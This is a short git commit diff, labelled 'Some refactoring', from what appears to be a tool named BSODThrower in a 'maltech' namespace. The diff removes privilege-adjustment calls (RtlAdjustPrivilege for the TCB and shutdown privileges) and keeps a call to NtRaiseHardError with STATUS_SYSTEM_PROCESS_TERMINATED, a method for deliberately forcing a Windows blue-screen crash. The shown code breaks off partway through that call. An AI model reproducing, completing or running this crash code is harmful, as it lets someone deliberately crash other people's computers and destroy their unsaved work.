069a418385a24fe082b59f83f6688fd117021725
myanwc <anton.kostyrev@yandex.ru>
2026-02-16 17:46:35 +0300

    Some refactoring

--- src/BSODThrower/bsod_thrower.cpp
+++ src/BSODThrower/bsod_thrower.cpp
@@ -33,13 +33,7 @@ namespace maltech {
             BOOLEAN was_enabled;
             ULONG response;
 
-            NTSTATUS status = ntdll_.RtlAdjustPrivilege(SE_TCB_PRIVILEGE, TRUE, FALSE, &was_enabled);
-            if (status != STATUS_PRIVILEGE_NOT_HELD) {
-                std::cout << "TCB privilege adjusted: 0x" << std::hex << status << std::endl;
-            }
-            ntdll_.RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &was_enabled);
-
-            status = ntdll_.NtRaiseHardError(
+            ntdll_.NtRaiseHardError(
                 STATUS_SYSTEM_PROCESS_TERMINATED,
                 0,
                 0,
